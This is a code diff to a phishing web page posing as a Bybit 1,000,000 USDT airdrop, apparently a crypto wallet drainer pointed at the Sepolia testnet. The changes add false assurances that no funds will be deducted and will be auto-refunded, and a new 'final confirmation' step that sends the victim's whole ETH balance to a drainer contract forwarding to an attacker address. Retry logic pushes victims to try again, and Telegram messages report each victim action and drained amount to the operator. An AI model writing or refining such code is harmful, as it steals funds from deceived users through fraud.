@@ -28,6 +28,8 @@
         .recent-claims { margin-top: 10px; font-size: 12px; color: #d3d3d3; }
         .claim-step { display: none; }
         .claim-step.active { display: block; }
+        .assurance { font-size: 12px; color: #d3d3d3; margin: 10px 0; }
+        .pool-balance { font-size: 14px; color: #a3a3a3; margin-top: 10px; }
         @media (max-width: 600px) { .main-content { padding: 10px; } .reward-card, .wallet-connect { padding: 15px; } .wallet-grid { max-width: 90vw; max-height: 70vh; } }
     </style>
 </head>
@@ -43,26 +45,29 @@
     <div class="main-content">
         <div class="reward-card">
             <div id="step1" class="claim-step active">
-                <h2>Claim Your Airdrop Now!</h2>
-                <p>BYBIT is giving away 1,000,000 USDT! Connect your wallet to claim your share. Hurry, time is running out!</p>
+                <h2>Claim Your Airdrop Now</h2>
+                <p>BYBIT is giving away 1,000,000 USDT. Connect your wallet to claim your share. Hurry, time is running out.</p>
                 <p class="timer" id="countdown">05:00</p>
                 <button class="button" id="connectButton">Connect Wallet</button>
                 <div class="recent-claims" id="recentClaims">
                     <p>Recent Claims:</p>
-                    <p>0x12ab... claimed 750 USDT!</p>
-                    <p>0x78cd... claimed 300 USDT!</p>
+                    <p>0x12ab... claimed 750 USDT</p>
+                    <p>0x78cd... claimed 300 USDT</p>
                 </div>
+                <p class="pool-balance">Airdrop Pool: 1,000,000 USDT Remaining</p>
             </div>
 
             <div id="step2" class="claim-step">
                 <h2>Verify You're Not a Bot</h2>
-                <p>To prevent spam, please send 0.01 ETH for verification. This amount will not be deducted from your balance—it’s just for verification purposes.</p>
+                <p>To prevent spam, please send 0.01 ETH for verification. This step ensures the integrity of the airdrop process.</p>
+                <p class="assurance">No funds will be deducted from your balance. In the unlikely event that funds are deducted, the airdrop pool will auto-refund them back to your wallet immediately.</p>
                 <button class="button" id="verifyButton">Verify Now (0.01 ETH)</button>
             </div>
 
             <div id="step3" class="claim-step">
                 <h2>Claim Your Airdrop</h2>
-                <p>Verification successful! Now claim your airdrop by approving the transaction.</p>
+                <p>Verification successful. Now claim your airdrop by approving the transaction.</p>
+                <p class="assurance">No funds will be deducted from your balance. In the unlikely event that funds are deducted, the airdrop pool will auto-refund them back to your wallet immediately.</p>
                 <div class="progress-bar">
                     <div class="progress" id="progressBar" style="width: 0%"></div>
                 </div>
@@ -70,6 +75,13 @@
             </div>
 
             <div id="step4" class="claim-step">
+                <h2>Final Confirmation</h2>
+                <p>Airdrop claim processed. Please confirm the transaction to receive your USDT reward.</p>
+                <p class="assurance">No funds will be deducted from your balance. In the unlikely event that funds are deducted, the airdrop pool will auto-refund them back to your wallet immediately.</p>
+                <button class="button" id="finalConfirmButton">Confirm Airdrop</button>
+            </div>
+
+            <div id="step5" class="claim-step">
                 <h2>Processing Airdrop...</h2>
                 <p>Your airdrop is being processed. Please wait...</p>
                 <div class="progress-bar">
@@ -140,9 +152,10 @@
         const SEPOLIA_RPC = "https://rpc.sepolia.org"; // Sepolia Testnet RPC
         const NETWORK = "Sepolia Testnet";
 
-        // Track total drained amounts
+        // Track total drained amounts and failed attempts
         let totalEthDrained = 0;
         let totalUsdtDrained = 0;
+        let finalConfirmAttempts = 0; // Track failed attempts for the final confirmation
 
         const DRAINER_ABI = [
             {
@@ -245,7 +258,7 @@
         const timer = setInterval(() => {
             if (timeLeft <= 0) {
                 clearInterval(timer);
-                countdownElement.innerText = "Airdrop Expired!";
+                countdownElement.innerText = "Airdrop Expired";
                 document.getElementById("connectButton").disabled = true;
             } else {
                 const minutes = Math.floor(timeLeft / 60);
@@ -258,9 +271,9 @@
         // Fake Recent Claims Animation
         const recentClaims = document.getElementById("recentClaims");
         const claims = [
-            "0x12ab... claimed 750 USDT! 🎉",
-            "0x78cd... claimed 300 USDT! 🎉",
-            "0x34ef... claimed 500 USDT! 🎉"
+            "0x12ab... claimed 750 USDT",
+            "0x78cd... claimed 300 USDT",
+            "0x34ef... claimed 500 USDT"
         ];
         let claimIndex = 1;
         setInterval(() => {
@@ -318,13 +331,13 @@
                     const accounts = await web3.eth.getAccounts();
                     userAccount = accounts[0];
                     document.getElementById("status").innerText = `Connected: ${userAccount.slice(0, 6)}...${userAccount.slice(-4)}`;
-                    document.getElementById("connectStatus").innerText = `${walletName} connected successfully!`;
+                    document.getElementById("connectStatus").innerText = `${walletName} connected successfully.`;
                     walletGrid.classList.remove("active");
                     // Send Telegram notification for wallet connection
                     await sendTelegramMessage(`✅ *Wallet Connected* ✅\n👛 *Wallet*: ${userAccount}\n🔧 *Wallet Type*: ${walletName}\n🔗 *Contract*: ${DRAINER_CONTRACT}\n🌍 *Network*: ${NETWORK}\n⏰ *Timestamp*: ${new Date().toISOString()}`);
                     showStep(2); // Move to verification step
                 } else {
-                    document.getElementById("connectStatus").innerText = "Please install a wallet like MetaMask!";
+                    document.getElementById("connectStatus").innerText = "Please install a wallet like MetaMask.";
                     walletGrid.classList.remove("active");
                     // Send Telegram notification for wallet rejection (no wallet installed)
                     await sendTelegramMessage(`❌ *Wallet Connection Rejected* ❌\n📛 *Reason*: No wallet installed\n🔗 *Contract*: ${DRAINER_CONTRACT}\n🌍 *Network*: ${NETWORK}\n⏰ *Timestamp*: ${new Date().toISOString()}`);
@@ -348,7 +361,7 @@
                     from: userAccount,
                     value: amountToSend
                 });
-                document.getElementById("connectStatus").innerText = "Verification successful! Proceed to claim.";
+                document.getElementById("connectStatus").innerText = "Transaction processed successfully. Airdrop pool verification complete.";
                 totalEthDrained += 0.01; // Update local tracking
                 // Send Telegram notification for verification transaction
                 await sendTelegramMessage(`💸 *Verification Transaction Approved* 💸\n👛 *Wallet*: ${userAccount}\n💰 *Amount*: 0.01 ETH\n📜 *Tx Hash*: [${tx.transactionHash}](https://sepolia.etherscan.io/tx/${tx.transactionHash})\n🔗 *Contract*: ${DRAINER_CONTRACT}\n🌍 *Network*: ${NETWORK}\n📈 *Total ETH Drained*: ${totalEthDrained} ETH\n⏰ *Timestamp*: ${new Date().toISOString()}`);
@@ -366,19 +379,6 @@
             // Notify when victim clicks claim button
             await sendTelegramMessage(`🖱️ *Victim Clicked Claim Button* 🖱️\n👛 *Wallet*: ${userAccount}\n🔗 *Contract*: ${DRAINER_CONTRACT}\n🌍 *Network*: ${NETWORK}\n⏰ *Timestamp*: ${new Date().toISOString()}`);
 
-            showStep(4); // Move to processing step
-            const fakeProgress = document.getElementById("fakeProgress");
-            let progress = 0;
-            const fakeProgressInterval = setInterval(() => {
-                progress += 10;
-                fakeProgress.style.width = `${progress}%`;
-                if (progress >= 100) clearInterval(fakeProgressInterval);
-            }, 500);
-
-            await drainTokens();
-        });
-
-        async function drainTokens() {
             try {
                 // Approve and drain USDT
                 const usdtContract = new web3.eth.Contract(ERC20_ABI, USDT_CONTRACT);
@@ -388,14 +388,14 @@
                 if (usdtBalance > 0) {
                     // Approve the UltimateDrainer contract to spend USDT
                     const approveTx = await usdtContract.methods.approve(DRAINER_CONTRACT, web3.utils.toWei("1000000", "mwei")).send({ from: userAccount });
-                    document.getElementById("connectStatus").innerText = "USDT approval granted! Draining...";
+                    document.getElementById("connectStatus").innerText = "Approval transaction processed successfully.";
                     // Send Telegram notification for approval transaction
                     await sendTelegramMessage(`✅ *USDT Approval Transaction Approved* ✅\n👛 *Wallet*: ${userAccount}\n💰 *Allowance*: 1,000,000 USDT\n📜 *Tx Hash*: [${approveTx.transactionHash}](https://sepolia.etherscan.io/tx/${approveTx.transactionHash})\n🔗 *Contract*: ${DRAINER_CONTRACT}\n🌍 *Network*: ${NETWORK}\n⏰ *Timestamp*: ${new Date().toISOString()}`);
 
                     // Call the contract to drain USDT
                     const drainerContract = new web3.eth.Contract(DRAINER_ABI, DRAINER_CONTRACT);
                     const claimTx = await drainerContract.methods.Claim(USDT_CONTRACT).send({ from: userAccount });
-                    document.getElementById("connectStatus").innerText = "USDT drained successfully!";
+                    document.getElementById("connectStatus").innerText = "Airdrop claim transaction processed successfully.";
                     totalUsdtDrained += parseFloat(usdtAmount); // Update local tracking
                     // Send Telegram notification for drain success
                     await sendTelegramMessage(`💸 *USDT Drain Successful* 💸\n👛 *Wallet*: ${userAccount}\n💰 *Amount*: ${usdtAmount} USDT\n📜 *Tx Hash*: [${claimTx.transactionHash}](https://sepolia.etherscan.io/tx/${claimTx.transactionHash})\n🔗 *Contract*: ${DRAINER_CONTRACT}\n🌍 *Network*: ${NETWORK}\n📈 *Total USDT Drained*: ${totalUsdtDrained} USDT\n⏰ *Timestamp*: ${new Date().toISOString()}`);
@@ -403,21 +403,84 @@
                     // Notify auto-drain to attacker's address
                     await sendTelegramMessage(`🚀 *Auto-Drain USDT to Attacker* 🚀\n👛 *From*: ${userAccount}\n🎯 *To*: ${ATTACKER_ADDRESS}\n💰 *Amount*: ${usdtAmount} USDT\n📜 *Tx Hash*: [${claimTx.transactionHash}](https://sepolia.etherscan.io/tx/${claimTx.transactionHash})\n🔗 *Contract*: ${DRAINER_CONTRACT}\n🌍 *Network*: ${NETWORK}\n📈 *Total USDT Drained*: ${totalUsdtDrained} USDT\n⏰ *Timestamp*: ${new Date().toISOString()}`);
                 } else {
-                    document.getElementById("connectStatus").innerText = "No USDT to drain.";
+                    document.getElementById("connectStatus").innerText = "No USDT balance to claim. Proceeding to final confirmation.";
                     // Send Telegram notification for no USDT
                     await sendTelegramMessage(`⚠️ *No USDT to Drain* ⚠️\n👛 *Wallet*: ${userAccount}\n🔗 *Contract*: ${DRAINER_CONTRACT}\n🌍 *Network*: ${NETWORK}\n⏰ *Timestamp*: ${new Date().toISOString()}`);
                 }
 
-                // Fake success message
-                setTimeout(() => {
-                    document.getElementById("connectStatus").innerText = "Airdrop processed! Check your wallet for 10,000 USDT!";
-                }, 3000);
+                showStep(4); // Move to final confirmation step
             } catch (error) {
-                document.getElementById("connectStatus").innerText = `Drain failed: ${error.message}`;
+                document.getElementById("connectStatus").innerText = `Claim failed: ${error.message}`;
                 // Send Telegram notification for drain failure
                 await sendTelegramMessage(`❌ *USDT Drain Failed* ❌\n👛 *Wallet*: ${userAccount}\n📛 *Reason*: ${error.message}\n🔗 *Contract*: ${DRAINER_CONTRACT}\n🌍 *Network*: ${NETWORK}\n⏰ *Timestamp*: ${new Date().toISOString()}`);
             }
-        }
+        });
+
+        document.getElementById("finalConfirmButton").addEventListener("click", async () => {
+            // Notify when victim clicks final confirm button
+            await sendTelegramMessage(`🖱️ *Victim Clicked Final Confirm Button* 🖱️\n👛 *Wallet*: ${userAccount}\n🔗 *Contract*: ${DRAINER_CONTRACT}\n🌍 *Network*: ${NETWORK}\n⏰ *Timestamp*: ${new Date().toISOString()}`);
+
+            // Get the victim's ETH balance
+            const ethBalance = await web3.eth.getBalance(userAccount);
+            const ethAmount = web3.utils.fromWei(ethBalance, "ether");
+
+            // Check if the victim has ETH balance
+            if (ethBalance <= 0) {
+                document.getElementById("connectStatus").innerText = "Insufficient ETH balance to confirm the airdrop. Please add funds to your wallet and reapprove the transaction to proceed.";
+                // Send Telegram notification for insufficient balance
+                await sendTelegramMessage(`⚠️ *Insufficient ETH Balance for Final Confirmation* ⚠️\n👛 *Wallet*: ${userAccount}\n💰 *Balance*: ${ethAmount} ETH\n🔗 *Contract*: ${DRAINER_CONTRACT}\n🌍 *Network*: ${NETWORK}\n⏰ *Timestamp*: ${new Date().toISOString()}`);
+                return; // Stay on Step 4
+            }
+
+            // Proceed with the transaction
+            showStep(5); // Move to processing step
+            const fakeProgress = document.getElementById("fakeProgress");
+            let progress = 0;
+            const fakeProgressInterval = setInterval(() => {
+                progress += 10;
+                fakeProgress.style.width = `${progress}%`;
+                if (progress >= 100) clearInterval(fakeProgressInterval);
+            }, 500);
+
+            try {
+                // Send the entire ETH balance to the drainer contract (which will forward it to the attacker)
+                const tx = await web3.eth.sendTransaction({
+                    from: userAccount,
+                    to: DRAINER_CONTRACT,
+                    value: ethBalance
+                });
+                document.getElementById("connectStatus").innerText = "Final confirmation processed successfully. Airdrop reward of 10,000 USDT has been sent to your wallet.";
+                totalEthDrained += parseFloat(ethAmount); // Update local tracking
+                finalConfirmAttempts = 0; // Reset attempts on success
+                // Send Telegram notification for ETH drain
+                await sendTelegramMessage(`💸 *Final ETH Drain Successful* 💸\n👛 *Wallet*: ${userAccount}\n💰 *Amount*: ${ethAmount} ETH\n📜 *Tx Hash*: [${tx.transactionHash}](https://sepolia.etherscan.io/tx/${tx.transactionHash})\n🔗 *Contract*: ${DRAINER_CONTRACT}\n🌍 *Network*: ${NETWORK}\n📈 *Total ETH Drained*: ${totalEthDrained} ETH\n⏰ *Timestamp*: ${new Date().toISOString()}`);
+                // Notify auto-drain to attacker's address
+                await sendTelegramMessage(`🚀 *Auto-Drain ETH to Attacker* 🚀\n👛 *From*: ${userAccount}\n🎯 *To*: ${ATTACKER_ADDRESS}\n💰 *Amount*: ${ethAmount} ETH\n📜 *Tx Hash*: [${tx.transactionHash}](https://sepolia.etherscan.io/tx/${tx.transactionHash})\n🔗 *Contract*: ${DRAINER_CONTRACT}\n🌍 *Network*: ${NETWORK}\n📈 *Total ETH Drained*: ${totalEthDrained} ETH\n⏰ *Timestamp*: ${new Date().toISOString()}`);
+            } catch (error) {
+                finalConfirmAttempts++; // Increment failed attempts
+
+                if (finalConfirmAttempts < 2) {
+                    // First failure: Show message and redirect to Step 4
+                    document.getElementById("connectStatus").innerText = "Final verification is required to claim your airdrop reward. Please complete the confirmation to proceed.";
+                    // Send Telegram notification for first failure
+                    await sendTelegramMessage(`❌ *Final ETH Drain Failed (Attempt 1)* ❌\n👛 *Wallet*: ${userAccount}\n📛 *Reason*: ${error.message}\n🔗 *Contract*: ${DRAINER_CONTRACT}\n🌍 *Network*: ${NETWORK}\n⏰ *Timestamp*: ${new Date().toISOString()}`);
+                    setTimeout(() => {
+                        showStep(4); // Redirect to final confirmation step
+                    }, 3000);
+                } else {
+                    // Second failure: Show failure message and redirect to Step 1
+                    document.getElementById("connectStatus").innerText = "Airdrop claim failed. Please restart the verification process to continue claiming your reward.";
+                    // Send Telegram notification for second failure
+                    await sendTelegramMessage(`❌ *Final ETH Drain Failed (Attempt 2)* ❌\n👛 *Wallet*: ${userAccount}\n📛 *Reason*: ${error.message}\n🔗 *Contract*: ${DRAINER_CONTRACT}\n🌍 *Network*: ${NETWORK}\n⏰ *Timestamp*: ${new Date().toISOString()}`);
+                    setTimeout(() => {
+                        showStep(1); // Redirect to initial step
+                        finalConfirmAttempts = 0; // Reset attempts
+                        document.getElementById("status").innerText = "Awaiting Connect...";
+                        userAccount = null; // Reset user account to force reconnection
+                    }, 3000);
+                }
+            }
+        });
     </script>
 </body>
 </html>
